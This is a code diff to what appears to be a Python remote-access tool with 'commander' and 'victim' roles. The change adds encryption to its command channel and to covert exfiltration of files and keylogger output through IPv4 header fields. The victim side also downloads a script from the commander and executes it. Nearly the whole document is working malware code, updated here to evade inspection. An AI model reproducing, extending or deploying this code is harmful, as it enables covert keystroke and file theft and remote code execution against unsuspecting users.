@@ -321,7 +321,7 @@ def covert_data_write_to_file(shared_key: bytes, covert_data: str, filename: str
             f.write(decrypted_data)
 
 
-def get_packet_count(client_socket: socket):
+def get_packet_count(client_socket: socket, shared_secret: bytes):
     """
     Returns the total number of packets from commander for
     accurate Scapy sniff functionality.
@@ -329,11 +329,14 @@ def get_packet_count(client_socket: socket):
     @param client_socket:
         The client socket
 
+    @param shared_secret:
+        The shared key for symmetric encryption/decryption
+
     @return: count
         An integer containing the total number of packets
         to be received
     """
-    count = int(client_socket.recv(1024).decode())
+    count = int(decrypt_string(client_socket.recv(1024).decode(), shared_secret))
     print(constants.CLIENT_RESPONSE.format(constants.CLIENT_TOTAL_PACKET_COUNT_MSG.format(count)))
     return count
 
@@ -638,7 +641,7 @@ def __is_valid_ipv6(address: str):
         return False
 
 
-def receive_get_ipv6_script(client_socket: socket.socket, client_ip: str, client_port: int):
+def receive_get_ipv6_script(client_socket: socket.socket, client_ip: str, client_port: int, shared_secret: bytes):
     """
     Get ipv6_getter.py from commander, executes the script and sends over
     IPv6 address and port.
@@ -652,29 +655,36 @@ def receive_get_ipv6_script(client_socket: socket.socket, client_ip: str, client
     @param client_port:
         A string containing the commander's port number
 
+    @param shared_secret:
+        The shared key for symmetric encryption/decryption
+
     @return: ipv6, port
         A tuple containing the IPv6 address and port number
         of the executing host machine
     """
     # Get the file name from Commander
-    res = client_socket.recv(1024).decode().split("/")
+    res = decrypt_string(client_socket.recv(1024).decode(), shared_secret).split("/")
     file_path = res[0]
     file_name = file_path.split(".")[0]  # => Must be without .py extension for importing
     cmdr_ipv6_addr = res[1]
 
-    # Receive File if exists (MUST DO: put in downloads/[client_ip])
-    with open(file_path, "wb") as file:
-        eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
+    # Loop to receive the entire IPv6 getter file data
+    encrypted_data = b""
+    eof_marker = constants.FILE_END_OF_FILE_SIGNAL
+    while True:
+        chunk = client_socket.recv(1024)
+        if not chunk:
+            break  # No more data received
+        if chunk.endswith(eof_marker):
+            encrypted_data += chunk[:-len(eof_marker)]  # Exclude the end-of-file marker
+            break
+        encrypted_data += chunk
 
-        while True:
-            file_data = client_socket.recv(1024)
-            if not file_data:
-                break  # No more data received
-            if file_data.endswith(eof_marker):
-                file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
-                break
-            else:
-                file.write(file_data)
+    # Decrypt and write to file
+    decrypted_data = decrypt(encrypted_data, shared_secret)
+
+    with open(file_path, constants.WRITE_BINARY_MODE) as file:
+        file.write(decrypted_data)
 
     # Perform Import and Run Function to get IPv6
     if is_file_openable(file_path):
@@ -687,20 +697,21 @@ def receive_get_ipv6_script(client_socket: socket.socket, client_ip: str, client
 
             if __is_valid_ipv6(ipv6):
                 print(constants.IPV6_FOUND_MSG.format(ipv6))
-                client_socket.send((constants.VICTIM_ACK + "/" + ipv6 + "/" + str(port)).encode())  # Transfer Result
+                client_socket.send(encrypt_string((constants.VICTIM_ACK + "/" + ipv6 + "/" + str(port)),
+                                                  shared_secret).encode())  # Transfer Result
                 os.remove(file_path)
                 return ipv6, port, cmdr_ipv6_addr
             else:
                 print(constants.IPV6_OPERATION_ERROR)
-                client_socket.send(constants.IPV6_ERROR_MSG_TO_CMDR.encode())
+                client_socket.send(encrypt_string(constants.IPV6_ERROR_MSG_TO_CMDR, shared_secret).encode())
                 os.remove(file_path)
                 return None, None, None
         else:
-            client_socket.send(constants.IMPORT_IPV6_SCRIPT_ERROR.format(file_path).encode())
+            client_socket.send(encrypt_string(constants.IMPORT_IPV6_SCRIPT_ERROR.format(file_path), shared_secret).encode())
             os.remove(file_path)
             return None, None, None
     else:
-        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+        client_socket.send(encrypt_string(constants.FILE_CANNOT_OPEN_TO_SENDER, shared_secret).encode())
         os.remove(file_path)
         return None, None, None
 
@@ -1501,7 +1512,8 @@ def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str, file_path: 
         send(packet, verbose=0)
 
 
-def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str,
+                               file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     version field.
@@ -1518,14 +1530,16 @@ def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str, file_pa
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in a packet
     packets = []
@@ -1537,7 +1551,7 @@ def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str, file_pa
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1547,7 +1561,8 @@ def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str, file_pa
         send(packet, verbose=0)
 
 
-def transfer_file_ipv4_ihl(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_ihl(client_sock: socket.socket, dest_ip: str,
+                           file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     IHL (Internet Header Length) field.
@@ -1569,14 +1584,16 @@ def transfer_file_ipv4_ihl(client_sock: socket.socket, dest_ip: str, file_path: 
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -1588,7 +1605,7 @@ def transfer_file_ipv4_ihl(client_sock: socket.socket, dest_ip: str, file_path: 
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1598,7 +1615,8 @@ def transfer_file_ipv4_ihl(client_sock: socket.socket, dest_ip: str, file_path: 
         send(packet, verbose=0)
 
 
-def transfer_file_ipv4_ds(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_ds(client_sock: socket.socket, dest_ip: str,
+                          file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     DS (differentiated services) field.
@@ -1615,14 +1633,16 @@ def transfer_file_ipv4_ds(client_sock: socket.socket, dest_ip: str, file_path: s
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -1634,7 +1654,7 @@ def transfer_file_ipv4_ds(client_sock: socket.socket, dest_ip: str, file_path: s
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1644,7 +1664,8 @@ def transfer_file_ipv4_ds(client_sock: socket.socket, dest_ip: str, file_path: s
         send(packet, verbose=0)
 
 
-def transfer_file_ipv4_ecn(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_ecn(client_sock: socket.socket, dest_ip: str,
+                           file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     ECN field.
@@ -1661,14 +1682,16 @@ def transfer_file_ipv4_ecn(client_sock: socket.socket, dest_ip: str, file_path: 
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -1681,7 +1704,7 @@ def transfer_file_ipv4_ecn(client_sock: socket.socket, dest_ip: str, file_path: 
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1691,7 +1714,8 @@ def transfer_file_ipv4_ecn(client_sock: socket.socket, dest_ip: str, file_path: 
         send(packet, verbose=0)
 
 
-def transfer_file_ipv4_total_length(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_total_length(client_sock: socket.socket, dest_ip: str,
+                                    file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     total length field.
@@ -1708,14 +1732,16 @@ def transfer_file_ipv4_total_length(client_sock: socket.socket, dest_ip: str, fi
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -1728,7 +1754,7 @@ def transfer_file_ipv4_total_length(client_sock: socket.socket, dest_ip: str, fi
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1738,7 +1764,8 @@ def transfer_file_ipv4_total_length(client_sock: socket.socket, dest_ip: str, fi
         send(packet, verbose=0)
 
 
-def transfer_file_ipv4_identification(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_identification(client_sock: socket.socket, dest_ip: str,
+                                      file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     identification field.
@@ -1755,14 +1782,16 @@ def transfer_file_ipv4_identification(client_sock: socket.socket, dest_ip: str, 
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -1774,7 +1803,7 @@ def transfer_file_ipv4_identification(client_sock: socket.socket, dest_ip: str, 
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1784,7 +1813,8 @@ def transfer_file_ipv4_identification(client_sock: socket.socket, dest_ip: str, 
         send(packet, verbose=0)
 
 
-def transfer_file_ipv4_flags(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_flags(client_sock: socket.socket, dest_ip: str,
+                             file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     flags field.
@@ -1801,14 +1831,16 @@ def transfer_file_ipv4_flags(client_sock: socket.socket, dest_ip: str, file_path
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -1820,7 +1852,7 @@ def transfer_file_ipv4_flags(client_sock: socket.socket, dest_ip: str, file_path
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1830,7 +1862,8 @@ def transfer_file_ipv4_flags(client_sock: socket.socket, dest_ip: str, file_path
         send(packet, verbose=0)
 
 
-def transfer_file_ipv4_frag_offset(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_frag_offset(client_sock: socket.socket, dest_ip: str,
+                                   file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     fragment offset field.
@@ -1847,14 +1880,16 @@ def transfer_file_ipv4_frag_offset(client_sock: socket.socket, dest_ip: str, fil
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -1866,7 +1901,7 @@ def transfer_file_ipv4_frag_offset(client_sock: socket.socket, dest_ip: str, fil
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1876,7 +1911,8 @@ def transfer_file_ipv4_frag_offset(client_sock: socket.socket, dest_ip: str, fil
         send(packet, verbose=0)
 
 
-def transfer_file_ipv4_protocol(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_protocol(client_sock: socket.socket, dest_ip: str,
+                                file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     protocol field.
@@ -1893,14 +1929,16 @@ def transfer_file_ipv4_protocol(client_sock: socket.socket, dest_ip: str, file_p
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -1912,7 +1950,7 @@ def transfer_file_ipv4_protocol(client_sock: socket.socket, dest_ip: str, file_p
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1922,7 +1960,8 @@ def transfer_file_ipv4_protocol(client_sock: socket.socket, dest_ip: str, file_p
         send(packet, verbose=0)
 
 
-def transfer_file_ipv4_header_chksum(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_header_chksum(client_sock: socket.socket, dest_ip: str,
+                                     file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     header checksum field.
@@ -1939,14 +1978,16 @@ def transfer_file_ipv4_header_chksum(client_sock: socket.socket, dest_ip: str, f
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -1958,7 +1999,7 @@ def transfer_file_ipv4_header_chksum(client_sock: socket.socket, dest_ip: str, f
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -1969,7 +2010,8 @@ def transfer_file_ipv4_header_chksum(client_sock: socket.socket, dest_ip: str, f
 
 
 def transfer_file_ipv4_src_addr(client_sock: socket.socket, client_ip: str,
-                                client_port: int, src_port: int, file_path: str):
+                                client_port: int, src_port: int, file_path: str,
+                                shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     source address field; uses TCP.
@@ -1999,14 +2041,16 @@ def transfer_file_ipv4_src_addr(client_sock: socket.socket, client_ip: str,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2018,7 +2062,7 @@ def transfer_file_ipv4_src_addr(client_sock: socket.socket, client_ip: str,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2028,7 +2072,8 @@ def transfer_file_ipv4_src_addr(client_sock: socket.socket, client_ip: str,
         send(packet, verbose=0)
 
 
-def transfer_file_ipv4_dst_addr(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_dst_addr(client_sock: socket.socket, dest_ip: str,
+                                file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     destination address field.
@@ -2053,14 +2098,16 @@ def transfer_file_ipv4_dst_addr(client_sock: socket.socket, dest_ip: str, file_p
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2072,7 +2119,7 @@ def transfer_file_ipv4_dst_addr(client_sock: socket.socket, dest_ip: str, file_p
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3654,7 +3701,8 @@ def __get_protocol_header_transfer_function_map():
 
 def transfer_file_covert(sock: socket.socket, dest_ip: str,
                          dest_port: int, source_port: int,
-                         choices: tuple, file_path: str):
+                         choices: tuple, file_path: str,
+                         shared_secret: bytes):
     # Initialize map
     header_field_function_map = __get_protocol_header_transfer_function_map()
 
@@ -3681,7 +3729,7 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str,
                 return None
 
             # Receive file, execute script and send IPv6 to commander for sniff (DON'T RETURN ANYTHING)
-            receive_get_ipv6_script(sock, dest_ip, dest_port)
+            receive_get_ipv6_script(sock, dest_ip, dest_port, shared_secret)
 
             # Get IPv6 address and port from commander
             cmdr_ipv6_addr, cmdr_ipv6_port = sock.recv(1024).decode().split("/")
@@ -3727,7 +3775,8 @@ def transfer_file_covert_helper_print_config(file_path: str, header: str, field:
 
 def transfer_keylog_file_covert(sock: socket.socket, dest_ip: str,
                                 dest_port: int, source_port: int,
-                                choices: tuple, file_path: str):
+                                choices: tuple, file_path: str,
+                                shared_secret: bytes):
     """
     A different version from the regular transfer_file_covert(),
     but specifically deals with the transfer of saved keylogged
@@ -3752,6 +3801,9 @@ def transfer_keylog_file_covert(sock: socket.socket, dest_ip: str,
     @param file_path:
         A string representing the file path of keylog .txt file in the current directory
 
+    @param shared_secret:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
     # CHECK: If destination field choice, do nothing
@@ -3769,18 +3821,18 @@ def transfer_keylog_file_covert(sock: socket.socket, dest_ip: str,
         # DIFFERENT HANDLERS: IPv4
         if constants.IPV4 in choices:
             if constants.SOURCE_ADDRESS_FIELD in choices:
-                selected_function(sock, dest_ip, dest_port, source_port, file_path)
+                selected_function(sock, dest_ip, dest_port, source_port, file_path, shared_secret)
 
             elif selected_function is not None and callable(selected_function):
-                selected_function(sock, dest_ip, file_path)
+                selected_function(sock, dest_ip, file_path, shared_secret)
 
         # DIFFERENT HANDLERS: IPv6
         elif constants.IPV6 in choices:
             # Receive file, execute script and send IPv6 to commander for sniff (DON'T RETURN ANYTHING)
-            receive_get_ipv6_script(sock, dest_ip, dest_port)
+            receive_get_ipv6_script(sock, dest_ip, dest_port, shared_secret)
 
             # Get IPv6 address and port from commander
-            cmdr_ipv6_addr, cmdr_ipv6_port = sock.recv(1024).decode().split("/")
+            cmdr_ipv6_addr, cmdr_ipv6_port = decrypt_string(sock.recv(1024).decode(), shared_secret).split("/")
             selected_function(sock, cmdr_ipv6_addr, int(cmdr_ipv6_port), file_path)
 
         # DIFFERENT HANDLERS: TCP or UDP
@@ -3799,7 +3851,7 @@ def transfer_keylog_file_covert(sock: socket.socket, dest_ip: str,
         return None
 
     # Get an ACK from the victim for success
-    transfer_result = sock.recv(1024).decode()
+    transfer_result = decrypt_string(sock.recv(1024).decode(), shared_secret)
 
     if transfer_result == constants.VICTIM_ACK:
         print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_path,
